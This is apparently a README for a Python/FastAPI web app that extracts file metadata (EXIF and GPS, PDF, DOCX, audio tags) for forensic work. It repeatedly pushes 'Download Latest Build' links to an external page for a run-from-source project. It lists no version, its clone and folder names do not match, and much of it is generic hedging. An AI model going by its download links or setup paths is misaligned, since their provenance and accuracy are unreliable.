# File Metadata Analyzer - Digital Forensics Tool 2026

> **File Metadata Analyzer is a Python and FastAPI web application for examining metadata in images, PDFs, DOCX documents, and audio files through a focused forensic workflow.**

[![Platform](https://img.shields.io/badge/Platform-Web%20application-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/larskaiser72/file-metadata-reviewer?style=flat-square)](https://github.com/larskaiser72/file-metadata-reviewer)

---

<p align="center">
  <a href="https://larskaiser72.github.io/file-metadata-reviewer/">
    <img src="https://img.shields.io/badge/Download-File%20Metadata%20Analyzer%20Latest-brightgreen?style=for-the-badge" alt="Download File Metadata Analyzer">
  </a>
</p>

> **[Download File Metadata Analyzer](https://larskaiser72.github.io/file-metadata-reviewer/)**

---

[Download Latest Build](https://larskaiser72.github.io/file-metadata-reviewer/)

---

## Overview

File Metadata Analyzer provides a browser-based workspace for investigating descriptive data stored inside commonly used files. It brings together metadata inspection for images, PDFs, DOCX files, and audio in one interface intended for investigators, analysts, and other technical users.

Implemented with Python and FastAPI, the application uses a terminal-inspired design with a matrix-rain visual style. Its streamlined analysis flow lets users examine EXIF fields, document properties, audio tags, and available location data without relying on several unrelated utilities.

---

## Capabilities

- Extracts EXIF fields from image files.
- Detects GPS coordinates and supplies Google Maps links when location data is embedded.
- Displays PDF author and creator fields, page totals, and encryption status.
- Reads DOCX author, revision, and timestamp information.
- Retrieves audio ID3 data such as artist and album.
- Reports audio bitrate and playback duration.
- Presents the analyzer through a matrix-rain, terminal-style web interface.
- Unifies image, document, PDF, and audio metadata handling in a FastAPI application.

---

## Getting Started

First download the repository and enter its project folder:

```bash
git clone https://github.com/larskaiser72/file-metadata-reviewer.git
cd file-metadata-analyzer
```

Set up an isolated Python environment:

```bash
python -m venv .venv
```

Activate it on macOS or Linux:

```bash
source .venv/bin/activate
```

For Windows PowerShell, use:

```powershell
.venv\Scripts\Activate.ps1
```

Install the dependencies declared by the project:

```bash
python -m pip install -r requirements.txt
```

Launch the FastAPI service with the project's documented entry point. For development, the usual command is:

```bash
uvicorn main:app --reload
```

Once the server starts, visit the local URL displayed in its output.

---

## Using the Analyzer

1. Run the FastAPI server.
2. Navigate to the application in a browser.
3. Choose or submit an image, PDF, DOCX document, or audio file.
4. Inspect the metadata groups produced by the application.
5. If GPS data is found, open the provided Google Maps link.
6. Use the returned information to compare files during a digital forensics investigation.

A typical local development launch uses:

```bash
uvicorn main:app --reload
```

The correct application module can vary with the repository's layout.

---

## Settings and Environment

Application behavior is defined by the Python source and the dependency files included with the project. Before starting the service, inspect the repository for supported environment variables, application options, and upload-related configuration.

Where the project supports `.env` files, a local development configuration could look like this:

```ini
APP_ENV=development
HOST=127.0.0.1
PORT=8000
```

Use only settings that the application actually defines or reads. When suitable, keep environment-specific configuration files out of version control.

---

## Requirements

- A Python runtime compatible with the project's dependencies.
- FastAPI and the additional packages listed in `requirements.txt`.
- A current web browser.
- Enough local storage for the files submitted for analysis.
- Network connectivity may be required when opening Google Maps links created from GPS data.
- Supported inputs include images, PDFs, DOCX documents, and audio files.

---

## Frequently Asked Questions

### Which formats are supported?

File Metadata Analyzer is intended to process images, PDF files, DOCX documents, and audio files. The fields it can display depend on the format and on which metadata the individual file contains.

### Will every image provide a location?

No. GPS information appears only when the image includes location metadata. If coordinates are available, the application can generate a Google Maps link for them.

### What PDF details are reported?

The PDF workflow can show the author, creator, page count, and encryption status.

### What can it extract from audio?

Audio analysis includes ID3 values such as artist and album, as well as bitrate and duration.

### Where are application options configured?

Review the Python modules, dependency files, and any environment-configuration documentation in the project to find supported settings. Avoid introducing variables that the application does not consume.

### What should I do if startup fails?

Check that the virtual environment is enabled and that all dependencies installed without errors. Verify that the FastAPI module in the launch command matches the repository structure, then examine the server output for the underlying error.

### How can I obtain updates?

Use the repository's latest build link or pull the newest commits from Git, then reinstall dependencies if the project dependency files have changed.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
